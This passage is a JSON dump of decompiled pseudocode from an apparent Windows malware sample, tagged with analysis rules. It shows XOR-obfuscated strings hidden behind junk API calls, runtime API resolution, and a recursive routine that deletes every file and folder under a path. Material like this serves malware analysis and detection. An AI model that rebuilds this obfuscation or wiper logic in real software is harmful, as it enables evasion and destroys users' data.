        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a020(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_64h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h = 0xf0e380d;\n    var_44h = 0x20071c21;\n    var_10h = 0x6;\n    var_40h._0_1_ = 6;\n    var_40h._1_1_ = 99;\n    var_8h = 0x636a4c63;\n    var_4h._0_2_ = 0x324d;\n    var_6ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_5ch = &var_48h - iVar4;\n    var_60h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar5 != 0x2501ed) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_10h) ^ (iVar11 + iVar4)[var_5ch];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_34h._0_2_ = 0x4612;\n    var_ch = 0x5;\n    var_34h._2_1_ = 5;\n    stack0xffffffcb = 0xd5b;\n    var_2fh = 0x7e;\n    var_2dh = 0x3a1f4103;\n    var_29h = 0x1c5a1b48;\n    var_25h = 0x553f4327;\n    var_21h = 0x3c5e210e;\n    var_1dh = 0x52270864;\n    var_19h = 0x7e094737;\n    var_15h._1_1_ = 0x52;\n    var_8h = 0x34523148;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x7a);\n    var_2eh = var_34h._2_1_;\n    var_15h._0_1_ = var_34h._2_1_;\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        iVar5 = var_60h;\n        if (iVar6 != 0xbe9085) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41e218 & 1) == 0) {\n        *0x41e218 = *0x41e218 | 1;\n        *0x41e214 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_60h);\n    }\n    if ((*0x41e218 & 2) == 0) {\n        *0x41e218 = *0x41e218 | 2;\n        *0x41e210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e214, iVar4);\n    }\n    if (*0x41e214 == 0) {\n        *0x41e214 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41e210 == NULL) {\n        var_34h._0_2_ = 0x4612;\n        var_34h._2_1_ = 5;\n        stack0xffffffcb = 0xd5b;\n        var_2fh = 0x7e;\n        var_2dh = 0x3a1f4103;\n        var_29h = 0x1c5a1b48;\n        var_25h = 0x553f4327;\n        var_21h = 0x3c5e210e;\n        var_1dh = 0x52270864;\n        var_19h = 0x7e094737;\n        var_15h._1_1_ = 0x52;\n        var_8h = 0x34523148;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x7a);\n        var_2eh = var_34h._2_1_;\n        var_15h._0_1_ = var_34h._2_1_;\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            if (iVar5 != 0xbe9085) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41e210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e214, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_60h;\n        iVar4 = var_5ch;\n    }\n    fcn.004098f6();\n    if ((*0x41e210 != NULL) && (iVar11 = (**0x41e210)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.00409e62(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h = fcn.00409e62(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_44h = *(iVar11 + 0x3c);\n                var_68h = *(iVar11 + 0x18) + 0x10;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                var_48h = *(iVar11 + 0x38);\n                var_50h = 4;\n                if ((var_48h != var_68h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_54h = fcn.00409e62(iVar11 + 0x68, 0x98);\n                        iVar5 = var_60h;\n                        iVar4 = var_5ch;\n                        if (var_54h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_48h = var_78h;\n                        var_44h = var_74h;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_70h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.00409e62(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_78h != var_68h) || (iVar5 = var_60h,  iVar4 = var_5ch,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_64h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_64h;\n}\n",
        "token_count": 3087
    },
    "0040a4f9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040a4f9(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    if ((*0x41dd30 | *0x41dd34) != 0) {\ncode_r0x0040a8bf:\n        var_ch = 0x41dd30;\n        goto code_r0x0040a8c4;\n    }\n    var_24h = 0xf0e380d;\n    var_20h = 0x20071c21;\n    var_18h = 6;\n    var_1ch._0_1_ = 6;\n    var_1ch._1_1_ = 99;\n    var_2ch = 0x636a4c63;\n    var_28h._0_2_ = 0x324d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    var_14h = &var_24h - iVar2;\n    var_8h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x2501ed) {\n            *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_14h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_44h = 0x282f1235;\n    var_40h = 0x60a2c2d;\n    var_3ch = 0x11173c39;\n    var_38h = 0xa2b253c;\n    var_34h = var_34h & 0xff000000 | 0x4d0c04;\n    var_20h = 0x4d68656f;\n    var_1ch._0_1_ = 0x59;\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_10h = 5;\n    iVar6 = 0;\n    var_4h = &var_44h - iVar2;\n    var_14h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar3 = var_8h;\n        if (iVar4 != 0x7f2d89) {\n            *(iVar6 + iVar2) = *(&var_20h + iVar6 % var_10h) ^ (iVar6 + iVar2)[var_4h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41dd30 = fcn.0040aa0e(iVar2);\n    if (*0x41dd30 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x0040a638:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_44h = 0x29234631;\n        var_40h = 0x1e5e281a;\n        var_3ch = 0x45130b38;\n        var_38h = 0xe1c2424;\n        var_34h = var_34h & 0xff000000 | 0x4c1450;\n        var_2ch = 0x4c70316b;\n        var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x6e);\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_20h = &var_44h - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar3 = var_8h;\n            if (iVar4 != 0xa0f857) {\n                *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_10h) ^ (iVar6 + iVar2)[var_20h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41dd38 = fcn.0040aa0e(iVar2);\n        iVar2 = var_14h;\n        if (*0x41dd38 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_44h = 0x343d1b0a;\n            var_40h = 0x9392502;\n            var_3ch = 0x20141a07;\n            var_38h = 0x3c040f35;\n            var_34h = var_34h & 0xff000000 | 0x501d1d;\n            var_2ch = 0x55706c50;\n            var_28h._0_2_ = 0x7372;\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_44h - iVar2;\n            var_10h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                iVar3 = var_8h;\n                if (iVar4 != 0x806e58) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_20h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41dd40 = fcn.0040aa0e(iVar2);\n            iVar2 = var_14h;\n            if (*0x41dd40 != 0) {\n                var_44h = 0x1f0c0d0e;\n                var_40h = 0x2c242838;\n                var_3ch = 0x6221430;\n                var_38h = 0x123c2932;\n                var_34h = 0x143b2021;\n                var_30h = 0x59;\n                var_2ch = 0x71597a54;\n                var_28h._0_2_ = 0x4955;\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_20h = &var_44h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                    iVar3 = var_8h;\n                    if (iVar4 != 0x61f178) {\n                        *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_20h];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41dd48 = fcn.0040aa0e(iVar2);\n                if (*0x41dd48 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_10h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x0040a8bf;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_10h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                goto code_r0x0040a638;\n            }\n            uVar1 = (*pcVar5)(0, var_10h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x0040a8c4:\n    *0x41dd44 = *0x41dd40 >> 0x20;\n    *0x41dd4c = *0x41dd48 >> 0x20;\n    *0x41dd3c = *0x41dd38 >> 0x20;\n    *0x41dd34 = *0x41dd30 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 2529
    },
    "0040ab8f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040ab8f(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint8_t var_24h [3];\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpLibFileName;\n    uint var_10h;\n    uint8_t *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h._0_2_ = 0x3118;\n    var_4h = 5;\n    var_28h._2_1_ = 5;\n    stack0xffffffd7 = 0x5f771242;\n    var_21h._0_1_ = 0x75;\n    var_21h._1_1_ = 0x42;\n    var_21h._2_1_ = 0x77;\n    lpLibFileName = 0x42753177;\n    var_10h._0_1_ = 0x77;\n    var_18h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = var_24h + (-4 - iVar3);\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar4 != 0x95e898) {\n            *(iVar8 + iVar3) = *(&lpLibFileName + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_38h = 0x15770f00;\n    var_34h = 0x1c756002;\n    var_30h = 0x473f223d;\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x32475300;\n    var_21h._0_1_ = 0x59;\n    var_21h._1_1_ = 0x4e;\n    uVar2 = (*pcVar6)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_38h - iVar3;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar4 != 0x849621) {\n            *(iVar8 + iVar3) = var_24h[iVar8 % var_4h] ^ (iVar8 + iVar3)[var_ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_38h = 0x3b313864;\n    var_34h = 0x31287235;\n    var_30h = 0x35432c34;\n    var_2ch._0_2_ = 0x5703;\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x54503700;\n    var_21h._0_1_ = 0x57;\n    var_21h._1_1_ = 0x59;\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_38h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0xcce815) {\n            *(iVar8 + iVar3) = var_24h[iVar8 % var_4h] ^ (iVar8 + iVar3)[&var_38h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_8h, var_1ch, var_18h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1285
    },
    "0040c87e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040c87e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t hFindFile;\n    uint var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar8 = 8;\n    var_20h = 0x104;\n    var_30h = fcn.0040c44d();\n    lpString2 = in_ECX;\n    if (var_30h != 0) {\n        lpString2 = var_30h;\n    }\n    var_18h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar2 = (*pcVar6)(8, var_18h * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_14h != 0) {\n            uVar2 = (*pcVar6)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x3667496a;\n                hFindFile = 0x36674936;\n                var_28h._0_2_ = 0x5456;\n                uVar2 = (*pcVar6)(8, 9);\n                uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_1ch = uVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                    if (iVar4 != 0xa53466) {\n                        var_24h = 0x6;\n                        *(iVar8 + uVar3) = *(&hFindFile + iVar8 % 6) ^ (iVar8 + uVar3)[&var_ch - uVar3];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_3ch = 0x61525a14;\n                var_38h = 0x78704874;\n                var_34h._0_2_ = 0x5a61;\n                hFindFile = 0x61785a48;\n                var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x5a);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar4 = 0;\n                var_24h = &var_3ch - iVar8;\n                do {\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                    iVar1 = var_14h;\n                    if (iVar5 != 0xd9692e) {\n                        var_24h = 0x5;\n                        *(iVar4 + iVar8) = *(&hFindFile + iVar4 % 5) ^ *((&var_3ch - iVar8) + iVar4 + iVar8);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar8);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar1, lpFindFileData);\n                uVar3 = var_1ch;\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_1ch = iVar4 + 2 + var_18h;\n                            if (var_20h < var_1ch) {\n                                uVar2 = (*pcVar6)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                uVar2 = (*pcVar6)(8, var_1ch * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_18h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar4 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.0040c87e(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar4 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar4 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar4 != 0);\n                }\n                uVar2 = (*pcVar6)(0, iVar8);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar6)(0, uVar3);\n                (*pcVar7)(uVar2);\n                uVar2 = (*pcVar6)(0, lpFindFileData);\n                (*pcVar7)(uVar2);\n                iVar8 = var_ch;\n            }\n            uVar2 = (*pcVar6)(0, var_14h);\n            (*pcVar7)(uVar2);\n        }\n        if (lpFileName != 0) {\n            uVar2 = (*pcVar6)(0, lpFileName);\n            (*pcVar7)(uVar2);\n        }\n    }\n    if (var_30h != 0) {\n        uVar2 = (*pcVar6)(0, var_30h);\n        (*pcVar7)(uVar2);\n    }\n    return iVar8;\n}\n",
        "token_count": 1814
    },
    "0040dad9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040dad9(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uchar *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    code *var_50h;\n    uint hObject;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    ushort var_14h;\n    uint var_12h;\n    uint var_eh;\n    uchar var_ah;\n    uchar uStack13;\n    uint *var_8h;\n    uint var_4h;\n    \n    puVar9 = &var_7ch;\n    var_5ch = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_64h = *0x41dad0;\n    var_60h = 0;\n    dwBytes = 0;\n    var_58h = 0;\n    var_30h = 0xf0e380d;\n    var_2ch = 0x20071c21;\n    var_8h = 0x6;\n    var_28h._0_2_ = 0x6306;\n    var_40h = 0x636a4c63;\n    var_3ch._0_2_ = 0x324d;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    do 